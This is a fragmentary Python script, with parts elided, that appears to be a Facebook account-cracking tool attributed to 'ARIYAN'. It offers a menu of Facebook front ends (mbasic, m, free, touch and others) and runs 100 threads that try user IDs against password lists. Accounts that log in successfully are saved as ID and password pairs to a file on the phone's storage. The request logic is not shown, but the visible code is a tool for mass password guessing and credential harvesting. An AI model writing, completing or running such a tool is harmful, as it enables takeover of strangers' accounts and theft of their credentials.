...
def sykology():
    ...
    print(logo)
    print(" \033[38;5;46m=============================")
    print(" \033[38;5;46m𝗜𝗔𝗠 𝗬𝗢𝗨𝗥 𝗕𝗔𝗕𝗔 (ARIYAN)")
    print(" \033[38;5;46m=============================")
    ...
    print(" \033[38;5;46m𝗜𝗔𝗠 𝗬𝗢𝗨𝗥 𝗕𝗔𝗕𝗔 (ARIYAN)🤗🤗")
    print(" \033[38;5;46m=============================")
    print(" \033[38;5;46m[ARIYAN𝟎𝟏] 𝑼𝑷𝑫𝑨𝑻𝑬 𝑴")
    print(" \033[38;5;46m[ARIYAN𝟎𝟐] 𝑼𝑷𝑫𝑨𝑻𝑬 𝑴𝑩𝑨𝑺𝑰𝑪")
    print(" \033[38;5;46m[ARIYAN𝟎𝟑] 𝑼𝑷𝑫𝑨𝑻𝑬 𝑷𝑭𝑹𝑬𝑬")
    print(" \033[38;5;46m[ARIYAN𝟎𝟒] 𝑼𝑷𝑫𝑨𝑻𝑬 𝑷")
    print(" \033[38;5;46m[ARIYAN𝟎𝟓] 𝑼𝑷𝑫𝑨𝑻𝑬 𝑿")
    print(" \033[38;5;46m[ARIYAN𝟎𝟔] 𝑼𝑷𝑫𝑨𝑻𝑬 𝑻𝑶𝑼𝑪𝑯") 
    print(" \033[38;5;46m=============================")
    line()
    gxd=input("𝑪𝑯𝑶𝑰𝑪𝑬 𝑼𝑷𝑫𝑨𝑻𝑬 𝑵𝑼𝑴𝑩𝑬𝑹:")
    if gxd in ["ariyan1","M"]:
        fb="m"
        fb1="M1"
    elif gxd in ["ariyan2","Mbasic"]:
        fb="mbasic"
        fb1="M2"
    elif gxd in ["ariyan3","Free"]:
        fb="free"
        fb1="M3"
    elif gxd in ["ariyan4","P"]:
        fb="p"
        fb1="M4"
    elif gxd in ["ariyan5","X"]:
        fb="x"
        fb1="M5"
    else:
        fb="touch"
    ...
    with ThreadPool(max_workers=100) as feel:
        ...
        print(logo)
        tl=str(len(emran))
        print(f"    \033[38;5;46mID SAVE: /\033[38;5;47msdcard/\033[38;5;49mOMOR-VAI-ok.txt") 
...
def random_subb(uid,pwx,fb,fb1):
    ...
    sys.stdout.write(f"\r\033[38;5;46m[🤩ARIYAN VAI🤩] [{fb1}] {loop}|{str(len(oks))}|0");sys.stdout.flush()
...
\033[33;1m𝙉𝙐𝙈𝘽𝙀𝙍\033[38;5;46m: {uid} 
\033[33;1m𝙋𝘼𝙎𝙎𝙒𝙊𝙍𝘿\033[38;5;46m: {ps}
""")
                open("/sdcard/𝙊𝙈𝙊𝙍-ok.txt","a").write(xd+"|"+ps+"\n")
                oks.append(uid)
                break
            else:
                continue
